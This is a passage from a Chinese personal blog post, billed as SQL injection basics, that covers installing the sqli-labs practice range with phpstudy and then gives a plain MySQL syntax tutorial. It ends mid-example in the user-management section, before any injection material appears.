<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>sql注入基础学习 | Dre4m1nd</title><meta name="author" content="Dre4m1nd"><meta name="copyright" content="Dre4m1nd"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="一 、sqli-labs 本地靶场安装1.phpstudy 安装phpstudy 官网：官网链接 下载  之后解压安装 2 下载 sqli-labs 源码sqli-labs：github 地址 下载好之后解压到 phpstudy 根目录下的 WWW目录下 并将 sqli-labs-master 文件夹重命名为 sqli-labs，如下图 3.修改配置文件**进入 sqlilabs&#x2F;sql"><meta property="og:type" content="article"><meta property="og:title" content="sql注入基础学习"><meta property="og:url" content="http://dre4m1nd.github.io/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Dre4m1nd"><meta property="og:description" content="一 、sqli-labs 本地靶场安装1.phpstudy 安装phpstudy 官网：官网链接 下载  之后解压安装 2 下载 sqli-labs 源码sqli-labs：github 地址 下载好之后解压到 phpstudy 根目录下的 WWW目录下 并将 sqli-labs-master 文件夹重命名为 sqli-labs，如下图 3.修改配置文件**进入 sqlilabs&#x2F;sql"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://dre4m1nd.github.io/img/Dre4m1nd.jpg"><meta property="article:published_time" content="2024-11-23T16:03:26.000Z"><meta property="article:modified_time" content="2024-11-23T16:11:41.943Z"><meta property="article:author" content="Dre4m1nd"><meta property="article:tag" content="sql注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://dre4m1nd.github.io/img/Dre4m1nd.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dre4m1nd.github.io/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>(() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d4f70d8e726baa25349d5b4c01691cc1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"sql注入基础学习",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,isShuoshuo:!1}</script><link rel="stylesheet" href="/css/imgloaded.css?1"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Dre4m1nd.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/余霞.png)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Dre4m1nd</span></a><a class="nav-page-title" href="/"><span class="site-name">sql注入基础学习</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sql注入基础学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-23T16:03:26.000Z" title="发表于 2024-11-24 00:03:26">2024-11-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-23T16:11:41.943Z" title="更新于 2024-11-24 00:11:41">2024-11-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="一-、sqli-labs-本地靶场安装"><a href="#一-、sqli-labs-本地靶场安装" class="headerlink" title="一 、sqli-labs 本地靶场安装"></a>一 、sqli-labs 本地靶场安装</h2><h3 id="1-phpstudy-安装"><a href="#1-phpstudy-安装" class="headerlink" title="1.phpstudy 安装"></a>1.phpstudy 安装</h3><p><strong>phpstudy 官网：</strong><a target="_blank" rel="noopener" href="https://www.xp.cn/php-study"><strong>官网链接</strong></a></p><p><strong>下载</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732184640656-239b19b5-c94b-4bf7-83ca-56bf9fdc7407.png" referrerpolicy="no-referrer"></p><p><strong>之后解压安装</strong></p><h3 id="2-下载-sqli-labs-源码"><a href="#2-下载-sqli-labs-源码" class="headerlink" title="2 下载 sqli-labs 源码"></a><strong>2 下载 sqli-labs 源码</strong></h3><p><strong>sqli-labs：</strong><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs"><strong>github 地址</strong></a></p><p><strong>下载好之后解压到 phpstudy 根目录下的 WWW目录下</strong></p><p><strong>并将 sqli-labs-master 文件夹重命名为 sqli-labs，如下图</strong><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732185665462-9a17ada5-c087-4247-8a07-eddf02f1db57.png" referrerpolicy="no-referrer"></p><h3 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3.修改配置文件"></a><strong>3.修改配置文件</strong></h3><p>**进入 sqlilabs&#x2F;sql-connections 目录下，记事本或其他编辑器打开db-creds.inc 文件，修改为：$dbpass&#x3D;’root’。 <strong><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732185821523-13255e38-2f3c-40b5-99d3-7fc2def70b65.png" referrerpolicy="no-referrer"></strong><strong>之后更换低版本的 php，5.x 都可以</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189365948-72977c21-8f45-438c-9465-fbd4e86d9460.png" referrerpolicy="no-referrer"></p><p><strong>之后更换到低版本 php</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189407171-de616796-250e-41da-9130-745fdc154aa7.png" referrerpolicy="no-referrer"></p><p>之后重启，就可以了。网址<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/">http://127.0.0.1/sqli-labs/</a><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189488834-fe85ed75-aef9-4185-85e8-4f59d0312c7c.png" referrerpolicy="no-referrer"></p><h2 id="二、了解-SQL"><a href="#二、了解-SQL" class="headerlink" title="二、了解 SQL"></a>二、了解 SQL</h2><h3 id="SQL-的定义"><a href="#SQL-的定义" class="headerlink" title="SQL 的定义"></a>SQL 的定义</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/PILIpilipala/article/details/113798383"><strong>参考文章</strong></a></p><p>**SQL（Structured Query Language）是“结构化查询语言”，它是对关系型数据库的操作语言。它可以应用到所有关系型数据库中。 **</p><h3 id="SQL-语法要求"><a href="#SQL-语法要求" class="headerlink" title="SQL 语法要求"></a>SQL 语法要求</h3><ul><li><strong>SQL 语句可以单行或多行书写，以分号结尾；</strong></li><li><strong>可以用空格和缩进来来增强语句的可读性；</strong></li><li><strong>关键字不区别大小写，建议使用大写；</strong></li></ul><h3 id="数据库的种类"><a href="#数据库的种类" class="headerlink" title="数据库的种类"></a>数据库的种类</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/molangmolang/article/details/136334715?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522fffc115fb4f31d53e2551b4e882d6592%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=fffc115fb4f31d53e2551b4e882d6592&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~baidu_landing_v2~default-4-136334715-null-null.nonecase&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%88%86%E7%B1%BB&spm=1018.2226.3001.4450"><strong>参考文章</strong></a></p><h4 id="常见的关系型数据库"><a href="#常见的关系型数据库" class="headerlink" title="常见的关系型数据库"></a>常见的关系型数据库</h4><p><strong>甲骨文公司的 Oracle Database：</strong>Oracle 是一款功能强大、高度可扩展的关系型数据库，广泛应用于企业级应用，如金融、电信等大型企业的核心业务系统。</p><p><strong>微软的 SQL Server：</strong>它与 Windows 操作系统紧密集成，提供了易于使用的管理工具和开发环境。SQL Server 在中小企业中应用广泛，尤其是在基于 Windows 平台的企业应用中。</p><p><strong>开源的 MySQL：</strong>MySQL 以其开源、免费、易用的特点，受到众多开发者的喜爱。它被广泛应用于 Web 应用开发，如电子商务网站、内容管理系统等。</p><p><strong>开源的 PostgreSQL：</strong>PostgreSQL 具有高度的可扩展性、丰富的数据类型和强大的事务处理能力，在科研、地理信息系统（GIS）等领域有广泛应用。</p><h4 id="常见的非关系型数据库"><a href="#常见的非关系型数据库" class="headerlink" title="常见的非关系型数据库"></a>常见的非关系型数据库</h4><p><strong>MongoDB</strong>：</p><p>基于分布式文件存储，数据以BSON格式存储，文档型数据库结构灵活。有强大横向扩展能力，适用于大数据量、高并发读写、数据结构多变场景，如社交网络和游戏行业。</p><p><strong>Redis</strong>：</p><p>内存数据库，读写速度极快。支持多种数据结构，用于缓存、消息队列、实时统计等场景，像电商网站缓存商品信息、实现排行榜功能。</p><p><strong>Cassandra</strong>：</p><p>高度可扩展，采用无主节点架构，可用性和容错性高。基于一致性哈希分布数据，适用于大规模分布式数据存储，在云计算、物联网领域应用广泛。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731998068006-cf0590bc-3a76-4e3b-a950-95178009bd56.png" referrerpolicy="no-referrer"></p><h2 id="三、了解-MySQL-基本语法"><a href="#三、了解-MySQL-基本语法" class="headerlink" title="三、了解 MySQL 基本语法"></a>三、了解 MySQL 基本语法</h2><p><a href="about:blank"><strong>参考文章</strong></a><strong>，内容过多，只作了解</strong></p><h3 id="四种语句类型"><a href="#四种语句类型" class="headerlink" title="四种语句类型"></a>四种语句类型</h3><ul><li>**DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； **</li><li><strong>DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；</strong></li><li><strong>DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。</strong></li><li><strong>DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；</strong></li></ul><h3 id="DDL（数据定义语言）"><a href="#DDL（数据定义语言）" class="headerlink" title="DDL（数据定义语言）"></a>DDL（数据定义语言）</h3><p>数据定义语言</p><h4 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h4><p>查询所有数据库：<br><code>SHOW DATABASES;</code><br>查询当前数据库：<br><code>SELECT DATABASE();</code><br>创建数据库：<br><code>CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];</code><br>删除数据库：<br><code>DROP DATABASE [ IF EXISTS ] 数据库名;</code><br>使用数据库：<br><code>USE 数据库名;</code></p><h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>UTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集</li></ul><h4 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h4><p>查询当前数据库所有表：<br><code>SHOW TABLES;</code><br>查询表结构：<br><code>DESC 表名;</code><br>查询指定表的建表语句：<br><code>SHOW CREATE TABLE 表名;</code></p><p>创建表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名(</span><br><span class="line">    字段1 字段1类型 [COMMENT 字段1注释],</span><br><span class="line">    字段2 字段2类型 [COMMENT 字段2注释],</span><br><span class="line">    字段3 字段3类型 [COMMENT 字段3注释],</span><br><span class="line">    ...</span><br><span class="line">    字段n 字段n类型 [COMMENT 字段n注释]</span><br><span class="line">)[ COMMENT 表注释 ];</span><br></pre></td></tr></table></figure><p><strong>最后一个字段后面没有逗号</strong></p><p>添加字段：<br><code>ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：<code>ALTER TABLE emp ADD nickname varchar(20) COMMENT &#39;昵称&#39;;</code></p><p>修改数据类型：<br><code>ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);</code><br>修改字段名和字段类型：<br><code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];</code><br>例：将emp表的nickname字段修改为username，类型为varchar(30)<br><code>ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#39;昵称&#39;;</code></p><p>删除字段：<br><code>ALTER TABLE 表名 DROP 字段名;</code></p><p>修改表名：<br><code>ALTER TABLE 表名 RENAME TO 新表名</code></p><p>删除表：<br><code>DROP TABLE [IF EXISTS] 表名;</code><br>删除表，并重新创建该表：<br><code>TRUNCATE TABLE 表名;</code></p><h3 id="DML（数据操作语言）"><a href="#DML（数据操作语言）" class="headerlink" title="DML（数据操作语言）"></a>DML（数据操作语言）</h3><h4 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h4><p>指定字段：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</code><br>全部字段：<br><code>INSERT INTO 表名 VALUES (值1, 值2, ...);</code></p><p>批量添加数据：<br><code>INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code><br><code>INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);</code></p><h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>字符串和日期类型数据应该包含在引号中</li><li>插入的数据大小应该在字段的规定范围内</li></ul><h4 id="更新和删除数据"><a href="#更新和删除数据" class="headerlink" title="更新和删除数据"></a>更新和删除数据</h4><p>修改数据：<br><code>UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];</code><br>例：<br><code>UPDATE emp SET name = &#39;Jack&#39; WHERE id = 1;</code></p><p>删除数据：<br><code>DELETE FROM 表名 [ WHERE 条件 ];</code></p><h3 id="DQL（数据查询语言）"><a href="#DQL（数据查询语言）" class="headerlink" title="DQL（数据查询语言）"></a>DQL（数据查询语言）</h3><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    字段列表</span><br><span class="line">FROM</span><br><span class="line">    表名字段</span><br><span class="line">WHERE</span><br><span class="line">    条件列表</span><br><span class="line">GROUP BY</span><br><span class="line">    分组字段列表</span><br><span class="line">HAVING</span><br><span class="line">    分组后的条件列表</span><br><span class="line">ORDER BY</span><br><span class="line">    排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">    分页参数</span><br></pre></td></tr></table></figure><h4 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h4><p>查询多个字段：<br><code>SELECT 字段1, 字段2, 字段3, ... FROM 表名;</code><br><code>SELECT * FROM 表名;</code></p><p>设置别名：<br><code>SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;</code><br><code>SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;</code></p><p>去除重复记录：<br><code>SELECT DISTINCT 字段列表 FROM 表名;</code></p><p>转义：<br><code>SELECT * FROM 表名 WHERE name LIKE &#39;/_张三&#39; ESCAPE &#39;/&#39;</code><br>&#x2F; 之后的_不作为通配符</p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 WHERE 条件列表;</code></p><p>条件：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364439536-14d94c78-95ca-4717-80f3-caf9b28dd410.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364445283-a17e8ad5-8883-49ca-8e97-0f1ee090fb6d.png" referrerpolicy="no-referrer"></p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-- 年龄等于30</span><br><span class="line">select * from employee where age = 30;</span><br><span class="line">-- 年龄小于30</span><br><span class="line">select * from employee where age &lt; 30;</span><br><span class="line">-- 小于等于</span><br><span class="line">select * from employee where age &lt;= 30;</span><br><span class="line">-- 没有身份证</span><br><span class="line">select * from employee where idcard is null or idcard = &#x27;&#x27;;</span><br><span class="line">-- 有身份证</span><br><span class="line">select * from employee where idcard;</span><br><span class="line">select * from employee where idcard is not null;</span><br><span class="line">-- 不等于</span><br><span class="line">select * from employee where age != 30;</span><br><span class="line">-- 年龄在20到30之间</span><br><span class="line">select * from employee where age between 20 and 30;</span><br><span class="line">select * from employee where age &gt;= 20 and age &lt;= 30;</span><br><span class="line">-- 下面语句不报错，但查不到任何信息</span><br><span class="line">select * from employee where age between 30 and 20;</span><br><span class="line">-- 性别为女且年龄小于30</span><br><span class="line">select * from employee where age &lt; 30 and gender = &#x27;女&#x27;;</span><br><span class="line">-- 年龄等于25或30或35</span><br><span class="line">select * from employee where age = 25 or age = 30 or age = 35;</span><br><span class="line">select * from employee where age in (25, 30, 35);</span><br><span class="line">-- 姓名为两个字</span><br><span class="line">select * from employee where name like &#x27;__&#x27;;</span><br><span class="line">-- 身份证最后为X</span><br><span class="line">select * from employee where idcard like &#x27;%X&#x27;;</span><br></pre></td></tr></table></figure><h4 id="聚合查询（聚合函数）"><a href="#聚合查询（聚合函数）" class="headerlink" title="聚合查询（聚合函数）"></a>聚合查询（聚合函数）</h4><p>常见聚合函数：</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>count</td><td>统计数量</td></tr><tr><td>max</td><td>最大值</td></tr><tr><td>min</td><td>最小值</td></tr><tr><td>avg</td><td>平均值</td></tr><tr><td>sum</td><td>求和</td></tr></tbody></table><p>语法：<br><code>SELECT 聚合函数(字段列表) FROM 表名;</code><br>例：<br><code>SELECT count(id) from employee where workaddress = &quot;广东省&quot;;</code></p><h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后的过滤条件 ];</code></p><p>where 和 having 的区别：</p><ul><li>执行时机不同：where是分组之前进行过滤，不满足where条件不参与分组；having是分组后对结果进行过滤。</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以。</li></ul><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 根据性别分组，统计男性和女性数量（只显示分组数量，不显示哪个是男哪个是女）</span><br><span class="line">select count(*) from employee group by gender;</span><br><span class="line">-- 根据性别分组，统计男性和女性数量</span><br><span class="line">select gender, count(*) from employee group by gender;</span><br><span class="line">-- 根据性别分组，统计男性和女性的平均年龄</span><br><span class="line">select gender, avg(age) from employee group by gender;</span><br><span class="line">-- 年龄小于45，并根据工作地址分组</span><br><span class="line">select workaddress, count(*) from employee where age &lt; 45 group by workaddress;</span><br><span class="line">-- 年龄小于45，并根据工作地址分组，获取员工数量大于等于3的工作地址</span><br><span class="line">select workaddress, count(*) address_count from employee where age &lt; 45 group by workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure><h5 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>执行顺序：where &gt; 聚合函数 &gt; having</li><li>分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul><h4 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1, 字段2 排序方式2;</code></p><p>排序方式：</p><ul><li>ASC: 升序（默认）</li><li>DESC: 降序</li></ul><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 根据年龄升序排序</span><br><span class="line">SELECT * FROM employee ORDER BY age ASC;</span><br><span class="line">SELECT * FROM employee ORDER BY age;</span><br><span class="line">-- 两字段排序，根据年龄升序排序，入职时间降序排序</span><br><span class="line">SELECT * FROM employee ORDER BY age ASC, entrydate DESC;</span><br></pre></td></tr></table></figure><h5 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h5><p>如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序</p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>语法：<br><code>SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数;</code></p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 查询第一页数据，展示10条</span><br><span class="line">SELECT * FROM employee LIMIT 0, 10;</span><br><span class="line">-- 查询第二页</span><br><span class="line">SELECT * FROM employee LIMIT 10, 10;</span><br></pre></td></tr></table></figure><h5 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>起始索引从0开始，起始索引 &#x3D; （查询页码 - 1） * 每页显示记录数</li><li>分页查询是数据库的方言，不同数据库有不同实现，MySQL是LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接简写 LIMIT 10</li></ul><h4 id="DQL执行顺序"><a href="#DQL执行顺序" class="headerlink" title="DQL执行顺序"></a>DQL执行顺序</h4><p>FROM -&gt; WHERE -&gt; GROUP BY -&gt; SELECT -&gt; ORDER BY -&gt; LIMIT</p><h3 id="DCL（数据控制语言）"><a href="#DCL（数据控制语言）" class="headerlink" title="DCL（数据控制语言）"></a>DCL（数据控制语言）</h3><h4 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h4><p>查询用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER mysql;</span><br><span class="line">SELECT * FROM user;</span><br></pre></td></tr></table></figure><p>创建用户:<br><code>CREATE USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED BY &#39;密码&#39;;</code></p><p>修改用户密码：<br><code>ALTER USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED WITH mysql_native_password BY &#39;新密码&#39;;</code></p><p>删除用户：<br><code>DROP USER &#39;用户名&#39;@&#39;主机名&#39;;</code></p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 创建用户test，只能在当前主机localhost访问</span><br><span class="line">create user &#x27;test&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">-- 创建用户test，能在任意主机访问</span><br><span class="line">create user &#x27;test&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">create user &#x27;test&#x27; identified by &#x27;123456&#x27;;</span><br><span 